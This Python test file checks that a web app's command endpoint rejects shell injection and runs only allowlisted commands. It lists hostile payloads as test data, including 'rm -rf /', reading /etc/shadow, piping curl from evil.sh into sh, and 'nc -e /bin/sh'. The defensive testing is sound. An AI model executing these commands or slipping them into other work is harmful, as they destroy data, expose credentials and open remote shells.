"""Terminal quick-command allowlist tests: injection must never run."""
import pytest

INJECTION_PAYLOADS = [
    'ls; rm -rf /',
    'rm -rf ~',
    'cat /etc/shadow',
    'ls $(whoami)',
    'whoami && curl evil.sh | sh',
    'echo hi > /tmp/pwn',
    'ls; ls; ls',
    "ps aux | grep 'x'; shutdown",
    '`id`',
    '$(id)',
    '; id',
    '| nc -e /bin/sh',
    'sudo su',
    'wget http://evil.sh/x -O /tmp/x',
    'ls -la /root',
]


class TestCommandAllowlist:
    def test_injection_payloads_all_rejected(self, client, auth_headers):
        for cmd in INJECTION_PAYLOADS:
            r = client.post('/api/command', json={'command': cmd}, headers=auth_headers)
            assert r.status_code == 403, f'payload not rejected: {cmd!r}'

    def test_empty_and_missing_command_rejected(self, client, auth_headers):
        assert client.post('/api/command', json={}, headers=auth_headers).status_code == 403
        assert client.post('/api/command', json={'command': ''}, headers=auth_headers).status_code == 403

    def test_allowed_commands_run(self, client, auth_headers):
        # POSIX-only commands; skip on Windows
        if __import__('os').name == 'nt':
            pytest.skip('POSIX commands')
        for cmd in ('whoami', 'pwd', 'uname -a'):
            r = client.post('/api/command', json={'command': cmd}, headers=auth_headers)
            assert r.status_code == 200, f'{cmd!r} -> {r.status_code}: {r.get_json()}'
            assert 'output' in r.get_json()

    def test_requires_auth(self, client):
        r = client.post('/api/command', json={'command': 'whoami'})
        assert r.status_code == 401

    def test_glob_and_pipe_entries_have_no_shell(self, client, auth_headers):
        """Entries that used to need a shell now run shell-free or are
        python-native. Verify the payloads stay in the table."""
        from routes.terminal import _ALLOWED_COMMANDS
        for spec in _ALLOWED_COMMANDS.values():
            argv, _max = spec
            if isinstance(argv, list):
                for part in argv:
                    assert '|' not in part and ';' not in part and '*' not in part, spec
